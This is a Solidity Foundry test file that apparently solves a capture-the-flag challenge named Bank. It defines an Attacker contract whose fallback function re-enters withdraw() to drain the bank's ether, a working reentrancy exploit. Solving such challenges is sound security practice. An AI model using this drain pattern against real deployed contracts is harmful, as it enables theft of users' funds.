// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Bank} from "challenges/2-Bank.sol";

contract BankTest is Test {
    Bank public bank;

    function setUp() public {
        bank = new Bank{value: 1 ether}();
    }

    function test_solve() public {
        Attacker attacker = new Attacker(address(bank));
        attacker.attack{value: 1 ether}();
        assertTrue(bank.isSolved());
    }
}

contract Attacker {
    Bank public target;
    constructor(address _target ) payable { 
        target = Bank(_target);
        target.registerWallet();
    }

    function attack() public payable{
        target.deposit{value: address(this).balance}(address(this).balance);
        target.withdraw();
    }

    fallback() external payable {
        if (address(target).balance > 0){
            target.withdraw();
        }
    }
}